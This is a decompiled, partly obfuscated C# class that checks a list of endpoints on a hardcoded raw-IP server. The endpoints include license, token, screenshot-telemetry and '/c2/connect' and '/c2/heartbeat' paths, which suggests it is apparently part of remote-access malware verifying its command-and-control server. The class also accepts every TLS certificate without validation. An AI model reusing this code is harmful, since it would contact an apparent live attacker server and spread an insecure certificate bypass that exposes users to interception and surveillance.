using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using EndpointCheckResult;
using EndpointValidationSummary;

namespace EndpointValidator;

public sealed class EndpointValidator
{
	private static readonly HttpClient httpClient_0;

	private static readonly string[] string_0;

	private bool bool_0;

	private byte byte_0;

	private string string_3;

	private bool Boolean_0
	{
		get
		{
			return bool_0;
		}
		set
		{
			bool_0 = value;
		}
	}

	private byte Byte_0
	{
		get
		{
			return byte_0;
		}
		set
		{
			byte_0 = value;
		}
	}

	private string String_0
	{
		get
		{
			return string_3;
		}
		set
		{
			string_3 = value;
		}
	}

	static EndpointValidator()
	{
		//IL_00a6: Expected I8, but got I4
		string_0 = new string[9] { "/api/v1/auth/validate-license", "/api/v1/auth/token", "/api/v1/auth/refresh", "/api/v1/telemetry/event", "/api/v1/telemetry/startup", "/api/v1/telemetry/screenshot", "/api/v1/security/event", "/api/v1/c2/connect", "/api/v1/c2/heartbeat" };
		httpClient_0 = new HttpClient(new HttpClientHandler
		{
			ServerCertificateCustomValidationCallback = (HttpRequestMessage message, X509Certificate2? cert, X509Chain? chain, SslPolicyErrors sslPolicyErrors) => true
		})
		{
			Timeout = TimeSpan.FromSeconds(30L)
		};
	}

	public static async Task<EndpointValidationSummary> ValidateAllEndpointsAsync()
	{
		string apiUrl = "http://31.177.83.245:3001";
		List<EndpointCheckResult> results = new List<EndpointCheckResult>();
		string[] array = string_0;
		foreach (string endpoint in array)
		{
			EndpointCheckResult gClass = await CheckEndpointAsync(apiUrl, endpoint);
			results.Add(gClass);
			if (!gClass.IsAvailable)
			{
				Logger.Fatal("[EndpointValidator] ❌ " + endpoint + " - FAILED: " + gClass.ErrorMessage);
			}
		}
		List<EndpointCheckResult> list = results.Where((EndpointCheckResult r) => !r.IsAvailable).ToList();
		bool flag = list.Count == 0;
		if (!flag)
		{
			Logger.Fatal($"[EndpointValidator] ❌ {list.Count}/{string_0.Length} endpoints FAILED");
			foreach (EndpointCheckResult item in list)
			{
				_ = item;
			}
		}
		return new EndpointValidationSummary
		{
			AllEndpointsAvailable = flag,
			TotalEndpoints = string_0.Length,
			AvailableEndpoints = results.Count((EndpointCheckResult r) => r.IsAvailable),
			FailedEndpoints = list.Select((EndpointCheckResult r) => r.Endpoint).ToArray(),
			Results = results.ToArray()
		};
	}

	private static async Task<EndpointCheckResult> CheckEndpointAsync(string baseUrl, string endpoint)
	{
		try
		{
			string requestUri = baseUrl + endpoint;
			HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Head, requestUri);
			HttpResponseMessage httpResponseMessage = await httpClient_0.SendAsync(request);
			bool flag = httpResponseMessage.StatusCode == HttpStatusCode.OK || httpResponseMessage.StatusCode == HttpStatusCode.MethodNotAllowed || httpResponseMessage.StatusCode == HttpStatusCode.Unauthorized || httpResponseMessage.StatusCode == HttpStatusCode.BadRequest;
			return new EndpointCheckResult
			{
				Endpoint = endpoint,
				IsAvailable = flag,
				StatusCode = (int)httpResponseMessage.StatusCode,
				ErrorMessage = (flag ? null : $"HTTP {(int)httpResponseMessage.StatusCode}")
			};
		}
		catch (HttpRequestException ex)
		{
			return new EndpointCheckResult
			{
				Endpoint = endpoint,
				IsAvailable = false,
				StatusCode = 0,
				ErrorMessage = "Connection error: " + ex.Message
			};
		}
		catch (TaskCanceledException)
		{
			return new EndpointCheckResult
			{
				Endpoint = endpoint,
				IsAvailable = false,
				StatusCode = 0,
				ErrorMessage = "Timeout (30s)"
			};
		}
		catch (Exception ex3)
		{
			return new EndpointCheckResult
			{
				Endpoint = endpoint,
				IsAvailable = false,
				StatusCode = 0,
				ErrorMessage = ex3.Message
			};
		}
	}
}
